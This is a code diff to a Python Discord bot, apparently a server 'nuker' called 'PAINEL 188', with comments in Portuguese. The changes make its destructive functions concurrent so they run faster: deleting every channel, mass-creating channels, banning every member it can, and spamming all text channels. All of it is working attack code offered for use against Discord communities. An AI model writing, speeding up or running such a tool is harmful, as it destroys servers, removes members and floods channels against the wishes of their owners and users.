@@ -6,6 +6,10 @@ from colorama import Fore, Style
 
 colorama.init(autoreset=True)
 
+# --- Configuração de Velocidade (Estilo INFZRNAL) ---
+# O semáforo permite até 50 tarefas simultâneas (o limite seguro para não levar crash)
+semaphore = asyncio.Semaphore(50)
+
 # Configuração de intenções
 intents = discord.Intents.all()
 client = discord.Client(intents=intents)
@@ -19,7 +23,7 @@ BANER = f"""{Fore.BLUE}{Style.BRIGHT}
  |_| /_/   \_\|___|_| \_||_____|_____| |_|\___/\___/ 
                                                       
 {Fore.CYAN}--------------------------------------------------
-      PAINEL 188 - MODO SEQUENCIAL
+      by 188 ¿
 --------------------------------------------------
 """
 
@@ -33,43 +37,61 @@ MENU = f"""{Fore.BLUE}
 └───────────────────────────────────────┘
 """
 
-# --- Funções de Ação ---
+# --- Funções de Ação (Lógica de Alta Velocidade) ---
 
-async def excluir_canais(guild):
-    print(f"{Fore.RED}[!] Deletando canais...")
-    for channel in guild.channels:
+async def deletar_canal_task(channel):
+    async with semaphore:
         try: await channel.delete()
         except: pass
-    print(f"{Fore.GREEN}[+] Canais limpos.")
+
+async def excluir_canais(guild):
+    print(f"{Fore.RED}[!] A apagar todos os canais em massa...")
+    # Cria uma lista de tarefas para todos os canais
+    tasks = [deletar_canal_task(ch) for ch in guild.channels]
+    # Executa todas ao mesmo tempo (Gather)
+    await asyncio.gather(*tasks)
+    print(f"{Fore.GREEN}[+] Canais limpos com velocidade turbo.")
+
+async def criar_canal_task(guild, nome):
+    async with semaphore:
+        try: await guild.create_text_channel(nome)
+        except: pass
 
 async def criar_canais(guild):
     nome = input(f"{Fore.CYAN}Nome dos canais: ")
     qtd = int(input(f"{Fore.CYAN}Quantidade: "))
-    for _ in range(qtd):
-        try: await guild.create_text_channel(nome)
-        except: pass
+    print(f"{Fore.YELLOW}[*] A criar {qtd} canais instantaneamente...")
+    tasks = [criar_canal_task(guild, nome) for _ in range(qtd)]
+    await asyncio.gather(*tasks)
     print(f"{Fore.GREEN}[+] Canais criados.")
 
+async def banir_membro_task(member):
+    async with semaphore:
+        try: await member.ban(reason="PAINEL 188 TURBO")
+        except: pass
+
 async def banir_todos(guild):
-    print(f"{Fore.RED}[!] Banindo membros...")
-    count = 0
-    for member in guild.members:
-        if member.top_role < guild.me.top_role and member != guild.owner:
-            try:
-                await member.ban(reason="PAINEL 188")
-                count += 1
-                print(f"{Fore.YELLOW}[-] Banido: {member.name}")
-            except: pass
-    print(f"{Fore.GREEN}[+] {count} membros banidos.")
+    print(f"{Fore.RED}[!] A banir membros em massa...")
+    # Filtra membros que podem ser banidos
+    membros = [m for m in guild.members if m.top_role < guild.me.top_role and m != guild.owner and not m.bot]
+    tasks = [banir_membro_task(m) for m in membros]
+    await asyncio.gather(*tasks)
+    print(f"{Fore.GREEN}[+] Banimento em massa finalizado.")
+
+async def spam_canal_task(canal, conteudo, repeticoes):
+    async with semaphore:
+        for _ in range(repeticoes):
+            try: 
+                await canal.send(conteudo)
+                await asyncio.sleep(0.01) # Delay mínimo para não travar a conexão
+            except: break
 
 async def spam_todos_canais(guild):
     conteudo = input(f"{Fore.CYAN}Mensagem: ")
     repeticoes = int(input(f"{Fore.CYAN}Vezes por canal: "))
-    for i in range(repeticoes):
-        for canal in guild.text_channels:
-            try: await canal.send(conteudo)
-            except: pass
-        await asyncio.sleep(0.00)
+    print(f"{Fore.YELLOW}[*] A iniciar Spam em todos os canais...")
+    tasks = [spam_canal_task(canal, conteudo, repeticoes) for canal in guild.text_channels]
+    await asyncio.gather(*tasks)
     print(f"{Fore.GREEN}[+] Spam finalizado.")
 
 # --- Loop de Comando ---
@@ -103,7 +125,7 @@ async def on_ready():
         elif op == "4":
             await spam_todos_canais(guild)
         elif op == "5":
-            print(f"{Fore.RED}Desconectando..."); await client.close(); break
+            print(f"{Fore.RED}A desligar..."); await client.close(); break
         else:
             print(f"{Fore.YELLOW}Opção inválida!")
 
